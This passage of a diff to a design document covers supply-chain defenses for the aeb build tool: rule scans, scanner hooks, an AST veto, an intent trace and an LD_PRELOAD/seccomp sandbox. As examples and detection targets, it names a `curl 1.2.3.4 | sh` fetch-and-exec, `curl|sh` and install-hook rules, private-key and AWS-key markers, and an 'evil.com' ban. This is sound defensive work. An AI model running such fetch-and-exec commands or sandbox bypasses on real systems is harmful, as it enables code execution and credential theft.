-running build at a layer it cannot reason its way around. aeb's leased agent
-has **three containment surfaces**, stacked as defense in depth, each
-catching what the layer above is blind to:
+### Tree & patch rule scan
 
-| Layer | Mechanism | Catches | Blind to |
-|---|---|---|---|
-| **Veto** (policy; in-process, pre-build) | `maybe_veto_build` tiers A/B/C | *Declared / readable* build-grammar escapes | Computed/opaque escapes; the compiled artifact |
-| **Aether sandbox** (per-process; `LD_PRELOAD`) | `spawn_sandboxed(grants, "aeb", target)` | *Runtime* fs/exec/tcp/env attempts by the build **and its children** — including computed ones the veto couldn't read | A statically-linked tool that bypasses libc; the artifact's later behaviour |
-| **Container / OS** (kernel namespaces, caps, netns) | `itests/agent-container` hardening | Everything that escapes the preload — kernel-level blast radius | (this is the floor) |
+The agent's pre-build gate (`lib/agent` `_veto_run_rules`) runs a data-driven
+rule list over the **prepared tree** and/or the **applied patch** before the
+build. Each rule is `(id, scope, pattern, reason)`; a hit on any rule vetoes
+with that reason. Scopes: `tree` (grep the worktree), `patch` (grep the applied
+delta — highest signal: the untrusted pre-integration change *introduced* the
+hit), `file` (a file-existence glob), `patchpath` (the patch touches a
+disallowed path). Built-in rules cover the June-2026 supply-chain
+install-script class: committed-secret markers (RSA/OpenSSH/PGP keys, AWS
+access-key id), a `binding.gyp` present (native-addon install-time build
+script), `pre/postinstall` manifest hooks, a `curl|sh` fetch-and-exec, a
+patch-introduced `extern`, and an opt-in tree-size cap
+(`AEB_AGENT_MAX_TREE_MB`). Operators extend via `AEB_AGENT_VETO_PATTERNS`.
+Pure + unit-tested; only the grep touches the filesystem.
 
-The middle layer is the one this section exists to capture, because it is
-**already implemented upstream in Aether and aeb has not yet consumed it**
-(LLM.md's scope table lists "Sandboxing / isolation" as a TODO — "Aether's
-runtime sandbox is per-process, not per-build-step." The finding below is
-that per-process is *enough*, because the build's children inherit it).
+### External-scanner hook (`--vet-tool '<cmd>'`)
 
-### The Aether sandbox primitive — `spawn_sandboxed` + the grandchild finding
+`aeb --vet-tool '<cmd>'` (repeatable) runs an operator-chosen scanner with the
+build root as cwd **before** the build; a **non-zero exit vetoes** (REFUSED,
+exit 3). The command is `eval`'d (operator-trusted — it came from the CLI, not
+the build graph), so real scanner expressions work:
 
-Aether ships a runtime containment sandbox (`runtime/aether_sandbox.c`,
-`runtime/aether_spawn_sandboxed.c`, `runtime/libaether_sandbox_preload.c`;
-demos in the Aether tree at `examples/sandbox-demo.ae` /
-`examples/sandbox-spawn.ae`). Two shapes:
-
-- **In-process** — `run_sandboxed(perms) |ctx| { ... }` installs a permission
-  checker for the current process; stdlib `fs`/`os`/`net` calls consult it
-  transparently (the contained code uses *normal* stdlib and "should not know
-  for sure it is contained" — a denied read is indistinguishable from
-  file-not-found).
-- **Cross-process** — `spawn_sandboxed(grants, program, arg) -> exit_code`
-  forks, serialises the grant list into POSIX shared memory, sets
-  `LD_PRELOAD=libaether_sandbox.so` + `AETHER_SANDBOX_SHM=<name>` in the
-  child's env, and `execlp`s. The preload intercepts libc `open` / `fopen` /
-  `connect` / `execve` / `getenv` (and `mmap`/`mprotect`/`dlopen`) and checks
-  each against the grants before calling through.
-
-Grants are `(category, pattern)` pairs with glob/prefix matching:
-`fs_read`, `fs_write`, `exec`, `tcp`, `tcp_listen`, `env` (and `*`/`*` for
-grant-all). E.g. `grant_fs_read("/etc/*")`, `grant_fs_write("/tmp/worker/*")`,
-`grant_exec("echo *")`, `grant_tcp("api.example.com")`.
-
-**The finding that makes this useful for the agent:** because
-`spawn_sandboxed` sets `LD_PRELOAD` and `AETHER_SANDBOX_SHM` as **environment
-variables** in the child before `execlp`, and the `execve` interceptor
-re-checks every subsequent exec against the same shared-memory grants, the
-sandbox **propagates to the entire process subtree.** If the agent spawns
-`aeb` sandboxed, then `aeb → gcc → cc1`, `aeb → javac`, etc. all run under
-the *same* grant list, each `connect()`/`open()`/`execve()` checked. So
-"per-process, not per-build-step" understates it: **one `spawn_sandboxed` of
-`aeb <target>` contains the whole build subtree.** That is precisely the
-per-build-step isolation the roadmap wanted, available today.
-
-This is also why the sandbox covers the veto's blind spot. A build that
-*computes* `curl 1.2.3.4 | sh` defeats tier C's trace (the command is opaque)
-— but the `connect(1.2.3.4)` is a real syscall, and the preload's `connect`
-interceptor denies it regardless of how the command string was built. **Policy
-can be fooled by opacity; the LD_PRELOAD interceptor sees the actual
-syscall.** The veto and the sandbox are not redundant — the sandbox is what
-makes "a clean veto is not a clean program" survivable.
-
-### How the agent would wire it (design — not implemented)
-
-In `tools/aeb-agent.ae`, the accepted-build path today is:
-
-```
-cmd = "cd '${workdir}' && aeb '${target}'"
-rc = os.system(cmd)
+```sh
+aeb --vet-tool 'semgrep --error .'    app/.build.ae
+aeb --vet-tool '! grep -rq AKIA .'    app/.build.ae   # veto if an AWS-key marker is present
 ```
 
-The sandboxed shape replaces the `os.system` with a `spawn_sandboxed` whose
-grant list is **the agent operator's policy** (the same authority that owns
-the veto rules — see the policy-class doc), derived from flags/config:
+**Fail-closed:** a tool that can't run — command-not-found (exit 127), or any
+error — vetoes too (a vet you asked for that can't run must not silently pass).
+Naming a tool implies `--vet`. The principle: **aeb invokes a SAST engine
+rather than becoming one** — the same principle the SBOM/CVE capability leans
+on for its verdict.
 
+### AST veto (`--vet [--veto-policy <f>]`)
+
+`aeb --vet [--veto-policy <path>]` runs the `tools/aeb-vet` gate before any
+build: it resolves the operator policy, refuses an in-tree policy path,
+enforces the zero-rules lint, runs `lib/veto`'s `decide()` per target on the
+emitted AST, and **exits 3** (refused) before the build.
+
+The veto consumes **`aetherc --emit=ast`** — the trusted compiler emits the
+name-resolved, typed AST as JSON; `lib/veto` walks the nodes. Because the
+callee is *resolved*, aliasing/concat can't dodge it. Rules: deny
+`extern`/`exec`/`net`/`import`, a `banned\t<substring>` rule against literal
+args, and a positive **coordinate allowlist** (`coord_verb`/`coord_allow` —
+gate a resolver verb's literal coordinate to an allowed *prefix*; the
+attacker-immovable stem). Nodes from trusted `--lib` roots (the SDKs) are
+origin-exempt; only untrusted-tree nodes trip.
+
+**Fail-closed by construction:** non-zero `aetherc` exit (no AST) → veto; an
+indirect (function-pointer) call in untrusted code → veto; a computed arg to an
+exec/net verb → veto; a deny-category node with NULL origin → veto + surface.
+
+### Dependency SBOM / CVE (`--resolve-only [--sbom-json <f>]`)
+
+`aeb --resolve-only [--sbom-json <path>]` resolves the target's dependency
+coordinates to their full **transitive closure** and emits it as JSON
+(`{"maven":["g:a:v",…]}`) **without building**. `tools/aeb-sbom` greps the
+coordinate `dep()`s statically (no build execution — the read-don't-run
+discipline) and runs `aeb-resolve.jar --output sbom`.
+
+aeb emits the SBOM; **the verdict is delegated to a scanner** via the
+external-scanner hook (the same "invoke a SAST engine" principle):
+
+```sh
+aeb --resolve-only --sbom-json out.json app/.build.ae
+aeb --vet-tool 'grype sbom:out.json --fail-on high'  app/.build.ae
 ```
-grants = sandbox("preint-build") {
-    grant_fs_read(repo)             // read the prepared tree
-    grant_fs_read("/usr/*")         // toolchain + libs
-    grant_fs_read("/lib/*")
-    grant_fs_write(target_dir)      // write only build outputs
-    grant_fs_write("/tmp/*")        // compilers stage here
-    grant_exec("/usr/bin/*")        // the compiler allowlist (see constraints)
-    // NO grant_tcp — see "network stance" below
-}
-rc = spawn_sandboxed(grants, "aeb", target)
-```
 
-### Constraints — state them or the layer will be over-trusted
+This catches the *which dependency versions* class (known-CVE, banned) that the
+AST veto and the sandbox **cannot see** — they inspect build *behaviour* /
+symbols, not which resolved versions enter the closure. Maven today; cargo
+(`.crate.ae`) and npm (`npm:`) follow the same `--output sbom` shape.
 
-1. **Linux-only.** `spawn_sandboxed` is `fork`/`shm_open`/`LD_PRELOAD`; on
-   non-Linux it returns `-1` with a clear message. The agent container is
-   Debian, so this is fine *there* — but a macOS/BSD agent host gets no
-   cross-process sandbox and must fall back to the container/VM layer.
-2. **`exec` grants are by resolved path.** The interceptor checks the
-   `execve` pathname against `exec` grants (prefix/glob). So the grant list
-   must enumerate the toolchain — `grant_exec("/usr/bin/*")` or a tighter
-   per-compiler allowlist. **Enumerating the toolchain correctly is the
-   work**; too broad and it's no fence, too narrow and legitimate builds
-   break. This enumeration *is* the policy.
-3. **libc-level, not kernel-level.** A statically-linked binary, or one that
-   issues raw syscalls bypassing libc, is **not** caught by the preload —
-   that is what the container/namespace layer (below it) is for. The sandbox
-   raises the cost of an escape; it is not a kernel jail.
-4. **Not a substitute for the container.** It is the *middle* layer. A build
-   the preload contains can still exhaust memory, fork-bomb, or fill the
-   disk — `pids`/`memory`/`cpu` cgroup limits and a read-only rootfs live at
-   the container layer, which is a separate hardening pass.
+### Intent trace (`--trace-intent [--intent-json <f>]`)
 
-### Network stance for a leased `preint` build
-
-**Default: no `tcp` grant at all.** A `preint` build leased to the agent
-should get *zero network*. The common case justifies it: the agent owns the
-origin and fetches the base tree itself (`_prepare_tree`'s
-`git fetch origin` + `git checkout`), so the sources are already on disk
-before the build runs; a compile-only build needs no socket. With no `tcp`
-grant, the preload denies *every* `connect()` — which is exactly what closes
-the computed-`curl|sh` hole at the syscall, no matter how the command was
-constructed.
-
-A build that *legitimately* needs the network (resolving Maven/npm/cargo
-coordinates at build time rather than from a pre-populated cache, or reaching
-an internal artifact mirror) is then the **explicit exception**: the operator
-adds a `grant_tcp(<host-or-ip>)` allowlist for that dispatch. The allowlist
-is itself attack surface, so the strong stance keeps it empty by default and
-makes every entry a deliberate operator decision. (If/when this is tied to
-the dispatch's policy class — `preint`=no-net, `ci`=allowlist — that is the
-plumbing described in the policy-class doc; not designed here beyond the
-default.)
-
-## The veto pipeline: three complementary tiers
-
-`maybe_veto_build(repo, target, purpose)` runs an ordered list of checks;
-any one may refuse. They differ by *what they inspect* and *what they cost*.
-
-### Tier A — tree scan (cheap, pre-everything)
-
-Grep/inspect the prepared tree (post-checkout, post-patch) for obvious
-red flags before any compile: committed secrets/private keys, banned
-files, oversize trees, files outside an allowed set. Implemented today as
-a single conservative example (a `BEGIN RSA PRIVATE KEY` marker scan) — the
-placeholder seam. Fast, dumb, catches the blatant. A hit on the *patch*
-specifically is the highest-signal case (the untrusted pre-integration
-delta introduced it).
-
-### Tier B — resolved-coordinate / SBOM meta (the dependency-CVE tier)
-
-Inspect the **resolved third-party closure** — the exact
-`group:artifact:version` set aeb already computes (`aeb-resolve.jar` /
-pnpm / cargo / NuGet) plus the `build.dep(...)` edge graph aeb extracts
-statically (`tools/extract-deps`, `target/_aeb/_edges.txt`). A veto here
-asks "does this build pull a known-vulnerable or banned dependency?" —
-against structured coordinates, NOT a regex over `pom.xml`. This is where
-OWASP-style dependency checks live. aeb *already produces* most of the
-input; it needs a resolve-only / meta-emit mode so the veto can read the
-closure without doing a full build. (See the "structured outputs" item in
-TODO.md § Test result reporting for the adjacent plumbing.)
-
-### Tier C — doppelganger-compile trace (the build-grammar-intent tier)
-
-**The interesting one, and the one this doc exists to capture.** Compile
-the target against a *doppelganger* `build` / `aether` / language SDK that,
-instead of *executing* the build, **records what the build would do** — its
-`os.system` calls, `dep()` edges, `link_flag`s, `extra_source`s, codegen,
-any `std.net`/`std.http` reach. The veto then inspects that **structured
-recorded intent** ("this build would `os.system('curl …')`", "would link
-`libsketchy.so`", "would reach 1.2.3.4") rather than regexing source.
+`aeb --trace-intent [--intent-json <path>]` compiles+runs the leaf against a
+**doppelganger `std.os`** (`lib/veto_trace_os`) whose `os.system` / `os.exec` /
+`os.run*` **RECORD** the command to a trace file instead of **EXECUTING** it,
+then emits the recorded intent as JSON (`{"system":[…],"exec":[…],"run":[…]}`).
+You see what the build *would do* without its effects firing — an evil
+`curl|sh` is recorded, not run.
 
 #### Why aeb can do this cheaply (the Action!/Interface-Builder trick)
 
-This is the same move as Denison Bollay's Action! (1988): interpret the
-*same source* into an *alternate context* — and Paul's tsyne WYSIWYG
-designer, which interprets a `.ts` UI script into a doppelganger Tsyne API
-that records widget metadata instead of drawing widgets
-(`tsyne/designer`). Provenance:
-- Action! — paulhammant.com 2013-03-28, "Interface Builder's Alternative
-  Lisp timeline": *"saved in Lisp, and interpreted the same on load … into
-  a context."*
-- tsyne designer — `designer/README.md`: *"the designer interprets the
-  to-be-designed .ts script into designer's own emulation of Tsyne's
-  TypeScript API."*
+This is the same move as Denison Bollay's Action! (1988): interpret the *same
+source* into an *alternate context*; and Paul's tsyne WYSIWYG designer, which
+interprets a `.ts` UI script into a doppelganger Tsyne API that records widget
+metadata instead of drawing widgets. The tsyne designer pays an **impedance
+cost** — it `tsc`-transpiles then *regex-rewrites* the output to swap the
+`require`. **aeb pays no such cost.** Which library an `.ae` sees is purely the
+`--lib` search path, so swapping in a doppelganger is just a `--lib` flag —
+same source, different library, **zero source/output rewriting.**
 
-The tsyne designer pays an **impedance cost** for the trick: it
-`tsc`-transpiles the script then *regex-rewrites the transpiled output* to
-swap `require("tsyne")` → `global.designer` (fragile — it depends on how
-`tsc` happens to emit import aliases; see `designer/src/server.ts`
-~1057–1098). **aeb pays no such cost.** Which SDK an `.ae` imports is
-purely the `--lib` search path — so swapping in a doppelganger is just
-`aetherc --lib <doppelganger-lib>`. Same source, different library, **zero
-source/output rewriting.** aeb has, via `--lib`, the clean "interpret into
-an alternate context" that the homoiconic Lisp case had natively and the
-TypeScript case has to fake. The pieces already exist: multi-`--lib`
-resolution (the `aeblabel`/`AEB_COMPILE_LIB` work) and the
-`maybe_veto_build` seam to host the trace inspection.
+The implementation insight: **`std.os` is the universal shell-out chokepoint.**
+Every SDK (gcc/javac/cargo/curl) routes its commands through `os.system` /
+`os.exec`, so one shadowed `std.os` captures the whole build's intent with **no
+SDK edits**. (`tools/aeb-trace` stages the doppelganger `std/`, `transform-ae`s
+the `aeb(cap)` node, wraps it in a `main()` harness, and compiles with a
+**cwd-local `--lib .`** — empirically the only form that shadows the builtin
+stdlib.)
 
-#### What tier C is, precisely — and its honest limits
+#### Honest limits (the whole point of a read-and-decide gate)
 
-It is **dynamic abstract interpretation of the build orchestration.** It
-faithfully traces *what the `.build.ae` declares/reaches on the path taken*.
-It is **not** a soundness proof, and three limits must be stated or it will
-be over-trusted:
+It is **dynamic abstract interpretation of the build orchestration** — it
+faithfully traces *what the build declares/reaches on the path taken*. It is
+**not** a soundness proof:
 
-1. **Orchestration only, never the app.** Tier C sees "the build runs
-   `javac` on these files" — never what the *compiled Java* does. (This is
-   the SCOPE boundary above, restated at the mechanism level. The whole
-   doppelganger sees the build-grammar layer; the trojan-in-the-output is
-   invisible to it by construction.)
-2. **One path, not all paths.** A `.build.ae` with `if env(X) { sys(a) }
-   else { sys(b) }` records the branch *this run* takes. You get *a* trace,
-   not *every* trace — the standard dynamic-analysis limitation. Sound
-   coverage would need symbolic/abstract walking, a much larger thing.
-3. **Opaque computation defeats understanding (but not detection).** A
-   `.build.ae` doing `os.system(decode(blob))` records
-   `os.system(<computed string>)` — the veto can still flag "opaque/
-   computed command → veto" as policy, but it cannot always *read* what
-   would run. Treat opacity itself as a vetoable signal.
+1. **Orchestration only, never the app.** It sees "the build runs `javac` on
+   these files" — never what the *compiled Java* does. (The SCOPE boundary,
+   restated at the mechanism level.)
+2. **One path, not all paths.** `if env(X) { sys(a) } else { sys(b) }` records
+   the branch *this run* takes — *a* trace, not *every* trace.
+3. **Opaque computation defeats reading (not detection).** `os.system(decode(
+   blob))` records `os.system(<computed>)` — policy can still flag opacity as a
+   vetoable signal, but it cannot always *read* what would run.
 
-So tier C is a **strong veto input for build-grammar escapes**, not a
-guarantee. "The build declared nothing I forbid, on the path it took" — a
-real, useful statement, within its stated limits.
+So the intent trace is a strong veto *input* for build-grammar escapes,
+complementary to the AST veto's symbol view — not a proof.
 
-## How the tiers compose
+---
 
+## The policy surface — an out-of-tree policy `.ae` (DSL), not a flag list
+
+The deny/allow policy is **not** a CLI category-list (`--deny extern,exec,…`)
+and **not** an external `deny.toml`. Both were rejected: a CLI list is
+**typo-prone and fails open** (`--deny exce` silently enforcing nothing is the
+worst outcome for a security gate); an external config format violates aeb's
+founding rule (*the `.ae` file is the single source of truth; external formats
+only via shell-out*).
+
+So the policy is an **aeb-native closure-DSL `.ae` file** served by the
+`lib/veto` SDK — same *shape* as a `.build.ae`, but with one critical
+difference in **where it lives**:
+
+> **NOT a dot-prefixed in-tree target.** aeb scans every dot-prefixed `.ae`
+> under cwd and makes it a DAG **node** ("filename is the route"). A policy must
+> be the *opposite* — it polices the tree, so it must not be a node *in* the
+> tree, and an untrusted dispatch must not be able to ship its own. So the
+> policy is a **plainly-named `.ae` at an operator-trusted, out-of-tree
+> location**, loaded *as policy* by `--vet`, never scanned as a target:
+>
+> - `aeb --vet --veto-policy /etc/aeb/policy.ae` (explicit operator path), or
+> - `$AEB_HOME/veto/default.ae` (the shipped default), or
+> - `.aeb/veto/policy.ae` (per-project, under the already-non-scanned `.aeb/`).
+>
+> aeb **refuses** a `--veto-policy` path that resolves inside the build tree
+> (the requester writing their own exemption = gate dead).
+
+```aether
+// /etc/aeb/policy.ae (or $AEB_HOME/veto/default.ae) — operator policy.
+// A normal .ae aeb compiles+runs AS POLICY — NOT a dot-prefixed build node.
+// Lives outside the build tree; reviewed in PRs; version-controlled; typed.
+import veto (policy, deny, banned, allow_exec, allow_import, coord_verb, coord_allow, scope)
+main() {
+    p = veto.policy()
+    veto.deny(p, "extern")               // no raw C escapes in untrusted code
+    veto.deny(p, "net")                  // no tcp/http reach
+    veto.deny(p, "exec")                 // deny shell-out by default…
+    veto.allow_exec(p, "gcc")            // …except the toolchain
+    veto.allow_exec(p, "javac")
+    veto.allow_import(p, "std.string")   // exempt this module from deny-import
+    veto.banned(p, "evil.com")           // substring in any literal arg → veto
+    veto.coord_verb(p, "maven_dep")      // gate this resolver verb's coordinate…
+    veto.coord_allow(p, "org.corp:")     // …to this allowed prefix (pinned stem)
+}
 ```
-maybe_veto_build(repo, target, purpose):
-  A. tree scan            (raw tree; cheap; pre-compile)        — implemented (stub)
-  B. resolved-dep / SBOM  (structured coordinates; needs resolve) — design
-  C. doppelganger trace   (--lib swap; records build intent)      — design
-  → first refusal wins → {status:"vetoed", reason}; no build runs
+
+Three properties this buys:
+
+1. **Self-vetting / lint (what vets the vetter).** The policy `.ae` *is Aether*
+   — `aetherc` typechecks it when aeb compiles it. A malformed policy
+   (`veto.dney(...)`, wrong arity, an unknown setter) is a **compile error**,
+   not a silent empty policy. aeb adds a lint: **`--vet` with a policy that
+   resolves to zero rules is itself an error** (vet-requested-but-denies-nothing
+   → refuse). Fail-closed by construction.
+2. **Outside the source tree.** Operator-owned, resolved from a trusted path,
+   never from the untrusted tree; aeb refuses an in-tree path. Same provenance
+   rule as the `--lib` SDK roots.
+3. **Cached once compiled.** The policy `.ae` → compiled policy is a
+   content-addressed build product (key on `sha256(policy.ae) + toolchain`),
+   compiled once and reused until the source changes.
+
+### The operator surfaces compose (and are kept separate on purpose)
+
+An operator drives three *distinct but composable* surfaces — deliberately
+**not** merged into one mega-object: each is proven and self-contained, each
+fails closed on its own, and the launch flags make the intent explicit:
+
+| Surface | Capability | Where it lives | Default |
+| --- | --- | --- | --- |
+| **veto policy** (`veto.*` rules) | tree-scan + AST veto | `--veto-policy <f>` → `$AEB_HOME/veto/default.ae` → built-in | deny `extern`+`exec` |
+| **vet-tool(s)** (external scanners) | external-scanner hook | `--vet-tool '<cmd>'` (repeatable, CLI) | none (opt-in) |
+| **sandbox profile** (`sandbox.*` grants) | runtime sandbox | `--sandbox-profile <f>` → `$AEB_HOME/sandbox/default.ae` → built-in | conservative, **no tcp** |
+
+Both `default.ae` files are operator-trusted, **out of tree**, and refused if
+their path resolves *inside* the build tree (same `_is_inside` check both gates
+use). A fully-armed invocation uses them together — static vetoes first, then
+the build runs contained:
+
+```sh
+aeb --vet \
+    --veto-policy     /etc/aeb/veto.ae     \   # AST veto: deny rules + coord allowlist
+    --vet-tool        'semgrep --error .'  \   # external scanner
+    --vet-tool        '! grep -rq AKIA .'  \   # a second scanner
+    --sandbox \
+    --sandbox-profile /etc/aeb/grants.ae   \   # deny-by-default grants (no tcp)
+    app/.build.ae
 ```
 
-- Run cheap→expensive (A, then B, then C) so a blatant tier-A hit short-
-  circuits before the costly resolve/doppelganger work.
-- The veto **list is pluggable** — each tier is N rules; OWASP/CVE is a
-  tier-B rule, "no network reach" / "no shell-out outside an allowlist" are
-  tier-C rules, "no committed secret" is a tier-A rule. New rules slot in
-  without reshaping `maybe_veto_build`.
-- Veto rules are **the agent operator's policy**, not the requester's — and
-  may be keyed by the dispatch's policy class (a `ci` dispatch stricter
-  than a `preint` one), per the policy-class doc.
-- A vetoed dispatch is **a refusal, not a build failure** — distinct
-  status (`vetoed`, HTTP 422), so the originator can tell "your build was
-  refused on policy" from "your build ran and failed."
+`--vet` and `--sandbox` are independent — use either alone, or together. Each
+flag-with-a-file implies its gate. Copy a `default.ae` and tighten it for a
+custom policy (e.g. `sandbox.grant_tcp(s, "crates.io")` for a build that
+legitimately fetches from a registry).
 
-## What to build, in order
+---
 
-0. ~~**The `--vet` launch mode + the policy surface** — the shared seam.~~
-   **SHIPPED for non-agent `aeb` (2026-06-08).** `aeb --vet [--veto-policy
-   <path>]` (trampoline flags → `AEB_VET`/`AEB_VETO_POLICY`) runs the
-   `tools/aeb-vet` gate before any build: it resolves the operator policy
-   (`--veto-policy` → `$AEB_HOME/veto/default.ae` → `lib/veto` built-in
-   default), **refuses an in-tree policy path** (security), compiles+runs the
-   policy to get its rules (self-vetting — a typo'd setter is a compile error),
-   enforces the **zero-rules lint**, runs `decide()` per named `.ae` target, and
-   **exits 3** (refused) before the build. Policy is operator-trusted,
-   out-of-tree, NOT a dot-prefixed target; the compiled policy lands under the
-   build's `target/_aeb/` (writable; never the read-only install tree). *Scope:*
-   **two modes — (a)** explicitly-named `*.ae` targets (target mode), and
-   **(b)** the **whole-tree scan** under `aeb --vet --scan '<glob>'` — the
-   trampoline runs `scan-ae-files` (the same discovery `aeb-main` uses), keeps
-   nodes whose basename matches the glob, and vets that whole set, refusing the
-   build on the first veto. The `--scan` glob is **required** (no un-scoped
-   whole-tree vet by accident). **Layer 1b** (`--vet-tool <cmd>`) also runs in
-   this gate, before the AST pass. *Still:* layer 3 (`spawn_sandboxed`) driven by
-   the same policy object.
-1. ~~**Tier A / layer 1a is in.** Generalize the single stub scan into a small
-   rule list.~~ **DONE (2026-06-05).** `lib/agent` `_veto_run_rules`: a
-   data-driven rule list (`id\tscope\tpattern\treason`), built-in secret/key
-   markers + an AWS-key rule scoped to the patch, operator-extensible via
-   `AEB_AGENT_VETO_PATTERNS`, per-rule `tree`/`patch` scope. **Next on 1a:** add
-   the June-2026 patterns (a `binding.gyp` in the tree, `pre/postinstall` in a
-   vendored manifest, `curl|sh` literal, `extern` in a user `.ae`), plus a tree
-   **size cap** and **patch-touches-disallowed-path** rule kind.
-2. ~~**Layer 1b — external-tool hook.** `--vet-tool <cmd>`: run an
-   operator-chosen scanner (python3 / semgrep / a CVE-or-secret tool) on the
-   tree/patch; non-zero exit vetoes.~~ **SHIPPED (2026-06-09).** `aeb --vet-tool
-   '<cmd>'` (repeatable) runs each operator scanner with the build root as cwd,
-   in the trampoline's `--vet` gate, **before the 2b AST gate and before any
-   build**. The command is `eval`'d (operator-trusted, from the CLI not the
-   build graph), so real scanner expressions work: `--vet-tool 'semgrep --error
-   .'`, `--vet-tool '! grep -rq AKIA .'` (veto if an AWS-key marker is present).
-   A **non-zero exit vetoes** (REFUSED, exit 3); naming a tool implies `--vet`.
-   **Fail-closed:** a tool that can't run — command-not-found (exit 127), or any
-   error — vetoes too (a vet you asked for that can't run must not silently
-   pass); the errexit/`set -e` trap that would otherwise abort before the verdict
-   is neutralised with `|| _vt_rc=$?`. Multiple `--vet-tool`s all run in order;
-   the first non-zero refuses. Live-verified: pass→build, `false`→veto,
-   not-found→veto, marker-present→veto, marker-absent→clear, two-tools-second-
-   fails→veto. *aeb invokes a SAST engine rather than becoming one.*
-3. **Layer 3 — runtime containment via `spawn_sandboxed` / LD_PRELOAD.** Run
-   the build under a deny-by-default grant profile (no tcp, no cred env, exec
-   allowlist) when `--vet`/`--sandbox` is on. **Highest value vs. the
-   June-2026 credential-harvest threat** — it dies at the libc boundary
-   regardless of how the build computed the exfil. Linux-first (macOS/BSD fall
-   back to the container layer). **Entrypoint model designed (2026-06-09),
-   core mechanism proven:** the build file is hosted as an Aether lib (no
-   binary `main`) and aeb calls its exported `aeb(cap)` in-process, passing the
-   operator-minted capability; the grant grammar is the honest layer, the
-   LD_PRELOAD enforcement is the un-forgeable fence. No aether change needed.
-   See [capability-entrypoint.md](capability-entrypoint.md).
-   **Implementation (2026-06-09, aeb d0d3c2b): mechanism SHIPPED, orchestrator
-   integration BLOCKED.** `lib/sandbox` (grant model + `default_profile` +
-   `intersect`, 29 assertions), `tools/aeb-sandbox` (out-of-tree profile
-   resolution, in-tree-profile refusal, lazy preload `.so` build,
-   `spawn_sandboxed(grants, sh, run-script)`), and the `aeb --sandbox` /
-   `--sandbox-profile` trampoline wiring are in. **Containment is proven:** a
-   controlled network build through `aeb-sandbox` is blocked at libc (curl
-   exit 2, no exfil) while the unsandboxed baseline connects. **But** a real
-   `aeb --sandbox <target>` does not yet complete. **Blocker #1 (the
-   toolchain-child segfault) was FIXED upstream in aether 0.229.0** —
-   the preload's unsafe `vfork()` wrapper was removed (credited to aeb's
-   report); the `ae`→gcc→cc1→ld pipeline now runs under `spawn_sandboxed`,
-   and granting `fs_write /dev/*` (esp. `/dev/null`) + `fs_read /dev/*,/proc/*`
-   in `default_profile` cleared a `resolve-imports.sh` retry loop.
-   **Blocker #2 RESOLVED (2026-06-09) — it was a stale preload `.so` on the
-   aeb side, not an aether bug.** The aether sibling root-caused it via `nm`:
-   the installed `libaether_sandbox.so` had been built from PRE-0.229.0 source
-   and still carried the unsafe `vfork()` wrapper (the SIGSEGV was in a `sh -c`
-   build child at its `vfork()`, cascading to rc 139/255). `_ensure_preload`
-   was caching the `.so` on `exists` alone; even an mtime check failed (a
-   stale `.so` with a coincidentally-newer mtime defeats it). Fix:
-   **always-rebuild** the `.so` from the current aether-install source (a
-   26 KB single-file `cc`, once per run). Plus `default_profile` now grants
-   `exec` for the build's `target/`+`repo` (the per-node orchestrator
-   `_ae_build_all` runs there) and `/dev/*`,`/proc/*` reads + `/dev/*` writes.
-   **Layer 3 is now UNBLOCKED:** `aeb --sandbox <target>` runs the real
-   orchestrator pipeline to completion (rc 0), contained under the grant
-   profile, no segfault — no aether change beyond the 0.229.0 vfork fix.
-   **Hardened further by aether 0.230.0 (issue #668):** the `fork`/process-
-   creation denial is now a **kernel-level seccomp-bpf fence** installed by
-   `spawn_sandboxed` (post-fork, pre-exec), not just an LD_PRELOAD
-   libc-symbol intercept. The old libc fence was bypassable by a raw
-   `syscall(SYS_clone3, …)` or glibc's inline `__vfork` (no libc symbol) —
-   so a malicious build could spawn processes despite a no-`fork` grant; gcc
-   itself uses those paths for `cc1`/`as`/`ld`. Now trapped with `EPERM` at
-   the kernel regardless of call path (x86_64; fail-closed `exit(126)` if
-   seccomp setup fails). This closes a real containment escape in aeb's
-   threat model. The fence lives in the launcher's runtime (compiled into
-   `tools/aeb-sandbox`), which `make install` rebuilds unconditionally — so
-   aeb picks it up automatically; the only always-rebuild we manage by hand
-   is the preload `.so`.
-4. ~~**Layer 2b — `aetherc --emit=ast` + aeb-side AST walk.**~~ **SHIPPED
-   (slice, 2026-06-08).** `aetherc --emit=ast` landed in aether **v0.226.0**
-   (name-resolved AST as JSON: `kind`/`file`/`line` + resolved `callee`,
-   `indirect` flag, `variadic`/`selected[]`/`glob`; fail-closed exit). `lib/veto`
-   consumes it: `veto.check(b) { aetherc(...) target(...) }` runs `--emit=ast`,
-   walks `nodes[]`, applies rules (deny `extern`/`exec`/`net`/`import`),
-   classifies origin by `--lib` prefix (SDKs exempt), and **fail-closes** on
-   non-zero exit / indirect call / NULL-origin match. **Now also consumes
-   `args[]`** (2026-06-08): reads the literal coordinate/command, fail-closes on
-   a computed exec/net arg, and adds the `banned\t<substring>` rule. Verified
-   live against the installed binary (`tests/test_veto.ae`, 57 assertions, incl.
-   the real `args[]` JSON shape; end-to-end smoke vetoes `extern syscall`,
-   clears clean code). **Default policy:** deny all
-   externs *except a known-safe runtime allowlist* (`println` etc. — the live
-   smoke caught that a blanket deny false-positives on every ordinary program)
-   + deny exec; (args[] consumed) the `banned\t<substring>` rule + computed-arg
-   fail-close; the **policy DSL** (`veto.policy`/`deny`/`banned`/
-   `allow_exec`/`allow_import`/`coord_verb`/`coord_allow`/`scope` → the rule
-   list; `test_veto_policy.ae`, 21 assertions + live smoke); the **`aeb --vet`
-   launch mode** wiring it all together (`tools/aeb-vet` gate — see item 0,
-   shipped); and the **agent-side `maybe_veto_build` wiring** — `tools/aeb-agent`'s
-   gate now runs Tier-A *then* the 2b AST veto (`_veto_ast`: emit the prepared
-   tree's target from inside the repo, resolve rules the same way —
-   `AEB_VETO_POLICY` policy or built-in default — and `decide()`), returning the
-   distinct `vetoed`/422 on a refusal. Live-verified: a dispatched
-   `extern syscall`/`os.system` tree → `vetoed`/422; a clean tree → `done`/`pass`
-   (built); a `coord_verb`-gated verb with a disallowed coordinate literal →
-   `veto:coord` REFUSED, an allowed-prefix literal → clear. The **whole-tree
-   scan veto** (`aeb --vet --scan '<glob>'`) is now shipped: the trampoline
-   discovers the tree via `scan-ae-files`, filters by the glob's basename, and
-   vets the whole set — live-verified that a scan-discovered (not CLI-named)
-   evil node is refused (`veto:coord`, exit 3) while a clean sibling clears.
-   **Next:** layer 3 (`spawn_sandboxed`) driven by the same policy object;
-   layer 1b (`--vet-tool`) is shipped. (Stopgap 2a — `.c`
